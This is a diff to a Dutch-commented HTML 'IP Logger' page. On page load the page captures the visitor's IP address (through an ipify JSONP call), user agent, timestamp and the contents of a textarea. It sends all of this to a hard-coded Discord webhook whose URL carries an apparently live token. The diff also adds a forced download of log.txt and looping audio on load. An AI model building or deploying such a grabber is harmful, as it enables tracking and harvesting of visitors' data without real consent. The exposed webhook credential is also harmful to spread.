@@ -10,12 +10,56 @@
             var ipAddress = json.ip;
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
-            sendToDiscord(ipAddress, userAgent, timestamp);
+            var searchHistory = document.getElementById('searchHistory').value;
+            logToFile(ipAddress, userAgent, timestamp, searchHistory);
+            sendToDiscord(ipAddress, userAgent, timestamp, searchHistory);
         }
 
-        // Functie om IP-adres, gebruikersagent en tijdstip naar Discord webhook te sturen
-        function sendToDiscord(ipAddress, userAgent, timestamp) {
+        // Functie om IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis naar een tekstbestand te loggen
+        function logToFile(ipAddress, userAgent, timestamp, searchHistory) {
+            var logData = "IP Address: " + ipAddress + "\nUser Agent: " + userAgent + "\nTimestamp: " + timestamp + "\nSearch History: " + searchHistory;
+            var blob = new Blob([logData], { type: 'text/plain' });
+            var link = document.createElement('a');
+            link.download = 'log.txt';
+            link.href = window.URL.createObjectURL(blob);
+            link.click();
+        }
+
+        // Functie om IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis naar Discord webhook te sturen in een embed bericht
+        function sendToDiscord(ipAddress, userAgent, timestamp, searchHistory) {
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
+
+            // Maak een embed object aan met de IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis
+            var embed = {
+                "embeds": [
+                    {
+                        "title": "IP Logger",
+                        "description": "Een gebruiker heeft de pagina bezocht.",
+                        "color": 16711680, // Rood
+                        "fields": [
+                            {
+                                "name": "IP Adres",
+                                "value": ipAddress,
+                                "inline": true
+                            },
+                            {
+                                "name": "Gebruikersagent",
+                                "value": userAgent,
+                                "inline": true
+                            },
+                            {
+                                "name": "Tijdstip",
+                                "value": timestamp,
+                                "inline": true
+                            },
+                            {
+                                "name": "Zoekgeschiedenis",
+                                "value": searchHistory
+                            }
+                        ]
+                    }
+                ]
+            };
 
             // Maak een nieuw XMLHttpRequest object aan
             var xhr = new XMLHttpRequest();
@@ -26,10 +70,8 @@
             // Stel de content type header in
             xhr.setRequestHeader("Content-Type", "application/json");
 
-            // Stel de payload in met IP-adres, gebruikersagent en tijdstip
-            var payload = JSON.stringify({
-                content: "IP Address: " + ipAddress + "\nUser Agent: " + userAgent + "\nTimestamp: " + timestamp
-            });
+            // Stel de payload in met het ingesloten bericht
+            var payload = JSON.stringify(embed);
             
             // Stuur het verzoek
             xhr.send(payload);
@@ -40,11 +82,17 @@
             var script = document.createElement('script');
             script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
             document.getElementsByTagName('head')[0].appendChild(script);
+            
+            var audio = new Audio('sound.mp3');
+            audio.loop = true;
+            audio.play();
         };
     </script>
 </head>
 <body>
     <h1>IP Logger</h1>
-    <p>Deze pagina logt uw IP-adres, gebruikersagent en tijdstip en stuurt het naar Discord.</p>
+    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en zoekgeschiedenis en stuurt het naar Discord.</p>
+    <label for="searchHistory">Zoekgeschiedenis:</label><br>
+    <textarea id="searchHistory" name="searchHistory" rows="4" cols="50"></textarea><br><br>
 </body>
 </html>
